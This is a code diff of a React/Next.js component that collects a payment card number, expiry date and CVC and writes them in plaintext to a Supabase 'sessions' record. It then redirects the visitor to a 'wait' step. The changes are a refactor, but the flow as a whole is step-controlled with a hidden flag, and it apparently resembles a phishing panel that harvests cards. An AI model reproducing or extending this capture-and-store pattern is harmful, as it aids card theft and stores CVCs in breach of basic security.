@@ -1,7 +1,6 @@
 "use client";
 
-import { useEffect, useState } from "react";
-import { useRouter } from "next/navigation";
+import { useEffect, useMemo, useState } from "react";
 import { DemoShell } from "@/components/demo/DemoShell";
 import { ConfigMissing } from "@/components/demo/ConfigMissing";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
@@ -13,14 +12,14 @@ type Props = {
 };
 
 export function CardClient({ sessionId }: Props) {
-  const router = useRouter();
-  const supabase = createBrowserSupabaseClient();
+  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const { settings, loading: settingsLoading } = useSettings();
   const [number, setNumber] = useState("");
   const [expiry, setExpiry] = useState("");
   const [cvc, setCvc] = useState("");
   const [saving, setSaving] = useState(false);
   const [msg, setMsg] = useState<string | null>(null);
+  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
   const ui = {
     panel: "app-panel rounded-2xl p-6",
     input: "app-input mt-1 w-full px-3 py-2",
@@ -34,6 +33,7 @@ export function CardClient({ sessionId }: Props) {
       const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
       if (cancelled || !data) return;
       const fd = (data.form_data ?? {}) as Record<string, string>;
+      setSessionFormData(fd);
       setNumber(fd.cardNumber ?? "");
       setExpiry(fd.cardExpiry ?? "");
       setCvc(fd.cardCvc ?? "");
@@ -66,24 +66,26 @@ export function CardClient({ sessionId }: Props) {
     setSaving(true);
     setMsg(null);
 
-    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
-    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
+    const nextFormData = {
+      ...sessionFormData,
+      cardHolder: "",
+      cardNumber: number.trim(),
+      cardExpiry: expiry.trim(),
+      cardCvc: cvc.trim(),
+    };
     const { error } = await supabase
       .from("sessions")
       .update({ is_hidden: false, current_step: "wait",
-        form_data: {
-          ...prev,
-          cardHolder: "",
-          cardNumber: number.trim(),
-          cardExpiry: expiry.trim(),
-          cardCvc: cvc.trim(),
-        },
+        form_data: nextFormData,
       })
       .eq("id", sessionId);
 
     setSaving(false);
     if (error) setMsg("Opslaan mislukt.");
-    else window.location.href = stepToPath("wait", sessionId);
+    else {
+      setSessionFormData(nextFormData);
+      window.location.href = stepToPath("wait", sessionId);
+    }
   }
 
 
